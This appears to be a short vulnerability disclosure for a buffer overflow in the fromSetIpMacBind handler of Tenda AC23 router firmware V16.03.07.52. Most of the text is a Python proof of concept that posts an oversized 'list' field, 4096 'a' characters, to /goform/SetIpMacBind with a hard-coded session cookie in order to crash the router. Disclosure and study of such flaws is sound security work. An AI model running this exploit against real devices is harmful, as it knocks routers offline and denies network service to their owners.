A buffer overflow vulnerability in Tenda AC23 V16.03.07.52 occurs because the fromSetIpMacBind function does not check the length of input data, which can be exploited by an attacker to launch a denial of service attack.

<img width="415" height="415" alt="image" src="https://github.com/user-attachments/assets/17f45c7a-a81d-40c6-9179-cad8e55736c7" />


POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/SetIpMacBind"

cookie = {"Cookie":"password=12345"}
data = {"list": payload, "bindnum": "1"}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
